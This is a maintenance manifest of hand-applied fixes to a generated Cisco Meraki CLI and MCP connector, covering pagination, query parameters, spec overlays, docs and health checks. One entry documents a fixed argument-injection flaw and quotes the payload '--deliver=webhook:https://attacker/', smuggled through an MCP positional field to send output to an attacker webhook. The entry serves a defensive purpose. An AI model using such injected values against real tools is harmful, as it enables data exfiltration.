_comment: Connector-specific edits that a cli-printing-press reprint must NOT clobber. First print 2026-10-13, press 4.33.5 (factory run ~/Documents/Dev/cli-factory/cisco-meraki). Spec-encoded fixes live in that run's spec/spec-overlay.json; generated-file call sites are re-applied by its tools/apply_handfixes.py after every generate --force (which drops them).

handfixes.summary: sync, --all (array and object envelopes) and fleet commands follow the Meraki Link header (rel=next carries startingAfter); a live page without rel=next is a proven end; repeated or cycling cursors stop the walk as incomplete (walkCursors) instead of looping
handfixes.why: Every Meraki list endpoint is a bare JSON array paged ONLY by the RFC 5988 Link header. The press reads cursors from JSON bodies and classifies perPage-only params as offset paging with no cursor (pagination_undeterminable x157), so sync and --all silently stopped after page one. Helpers live in hand-authored internal/cli/meraki_link_pagination.go (client hook wraps the transport); 8 call sites in generated sync.go/helpers.go are re-applied by tools/apply_handfixes.py. TestPaginatedGetAllFollowsLinkHeader fails if they are dropped.
handfixes.spec_encode_followup: Not spec-encodable on press 4.33.5 (x-pp-pagination accepts only 'none'; no response-header cursor support). File a press retro for Link-header pagination.

handfixes.summary: All 399 array query params send name[] (statuses[]=offline), via x-url-name in the spec overlay
handfixes.why: Meraki only honors bracketed array keys (the official Python SDK rewrites every array param to k[]). The OpenAPI declares bare names with form/explode, so generated commands sent statuses=offline and the filter was silently ignored, returning unfiltered results.
handfixes.spec_encode_followup: Spec-encoded: x-url-name "<name>[]" on every array query param in spec/spec-overlay.json. Keep it on any spec refresh.

handfixes.summary: Spec overlay: numeric-string maximum/minimum coerced to numbers; 26 deep request-body objects collapsed to one JSON flag; x-resource-id on 7 org resources; examples on all path + required query params; per-op security referencing the undefined oauth2 scheme removed (849 ops); info.contact.url/x-website set to the Dashboard API docs and x-auth-key-url to Meraki's key how-to; perPage minimum/maximum encoded from each endpoint's documented 'Acceptable range' (179 params) so sync page sizes stay within limits
handfixes.why: kin-openapi rejects string maximums (generation fails); flattened nested body names exceeded the 64-char MCP property-key limit (generation fails); devices were keyed by display name (non-unique); with no param examples the generator omitted Example lines (0% example coverage).
handfixes.spec_encode_followup: Spec-encoded in spec/spec-overlay.json (tools/collapse_long_body_fields.py rebuilds the collapse on a fresh upstream spec).

handfixes.summary: README/SKILL/AGENTS template boilerplate corrected by tools/apply_handfixes.py (DOC_PATCHES) (in msp-skills the source README is vendored as guide.md, so the README patches land there)
handfixes.why: Press templates render a devices get mock-value sample, an MCP install line without the API key env, a config path derived from the spec title (meraki-dashboard-pp-cli), CISCO_MERAKI_BASEPATH instead of CISCO_MERAKI_BASE_PATH, a --yes confirmation claim the CLI does not enforce, exit-code tables without 1, and <command> placeholders.
handfixes.spec_encode_followup: Template defects; press retro. Re-run tools/apply_handfixes.py after every generate.

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. Guarded call site: handleLocateAMacFromASocAlert (the locate_a_mac_from_a_soc_alert intent, `fleet find <ref>`).
handfixes.why: Reachable here: press 4.33.5 still emits the unguarded recipe path, and internal/mcp/intents.go handleLocateAMacFromASocAlert called appendRecipePositional(args, input["ref"], true) with no check, so the MCP tool call {"ref": "--deliver=webhook:https://attacker/"} ran `fleet find --deliver=webhook:https://attacker/ --agent` and pflag parsed the value as the denylisted root --deliver flag (proven on this connector 2026-10-13: with the guard stubbed out, TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional fails showing exactly that argv; with the guard it passes). Fleet origin: found by Codex adversarial review of the mcp-argv-value-joined backport (2026-09-09); upstream cli-printing-press fixed cliArgsFromMCP (#4647, present in 4.33.5's shellout.go) but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. The factory's tools/apply_handfixes.py re-applies the intents.go edit after a regenerate; the two tests in recipe_intents_test.go must be restored by hand. Mirrors cobratree.validatePositionalArgsForMCP. Retire only when the press generator refuses flag-like recipe positionals itself.

handfixes.summary: The MCP cisco-meraki_execute tool marks a GET result has_more when the response's Link header names another page: with next_starting_after when the whole upstream page fit in the (50-item) MCP result, and, when the result was truncated to fit, a note to re-request with a smaller perPage instead of a cursor that would skip the cut items
handfixes.why: Every non-fleet operation reaches MCP agents through cisco-meraki_execute, which sends one GET and dropped the Link header, so an agent asking for network clients (default perPage 10 on many endpoints) silently got page one - the failure meraki-link-pagination fixed for sync, --all and fleet but not this twin path. Found by the fresh-context adversarial review (2026-10-13). The result is already capped at 50 items per MCP call, so the fix reports the cursor rather than walking every page. Helpers live in the hand-authored internal/cli/meraki_link_pagination.go (WithMerakiLinkNext, AnnotateMerakiNextPage); the three call-site lines in generated code_orch.go are re-applied by the factory's tools/apply_handfixes.py. TestCodeOrchExecuteReportsMerakiNextPage fails with the annotation removed (proven 2026-10-13). Round-2 adversarial review (2026-10-13) caught that the first version offered the Link cursor even when bound truncated a large page to 50 items, so following it skipped items 51..perPage; TestCodeOrchExecuteTruncatedPageWithholdsCursor fails on that version (proven) and a 1,200-item walk through the real MCP binary following the tool's own instructions returned all 1,200 with no gaps.
handfixes.spec_encode_followup: Not spec-encodable; press retro: execute should surface response-header pagination.

handfixes.summary: doctor reports a 404 from its health path (/administered/identities/me) as a WARN naming CISCO_MERAKI_BASE_URL instead of 'reachable', and the default base URL is the literal https://api.meraki.com/api/v1 (no {basePath} template, no CISCO_MERAKI_BASE_PATH)
handfixes.why: check_doctor_truth.py (issue #282) failed two ways. wrong-base: a base_url whose every API path 404s rendered as 'reachable (HTTP 404 at /)', a health claim for a broken install. placeholder: the gate treats any {var} in the default base URL as an unset placeholder, so the generated https://api.meraki.com/{basePath} - which always resolved to the working api/v1 - made it demand that doctor call a correct global-dashboard install broken. The spec's basePath server variable only ever had one value, so the default is now literal (spec-encoded in the factory's spec/spec-overlay.json servers block, so the next generate emits it natively) and CISCO_MERAKI_BASE_PATH, an env var that only ever selected that one value, is gone from the binary and every install surface. Proven both directions 2026-10-13: the original doctor.go fails the gate's wrong-base state, the fixed one passes all states.
handfixes.spec_encode_followup: Base URL: spec-encoded (overlay servers). doctor 404 verdict: press retro (any non-auth 404 at the health path should be negative).
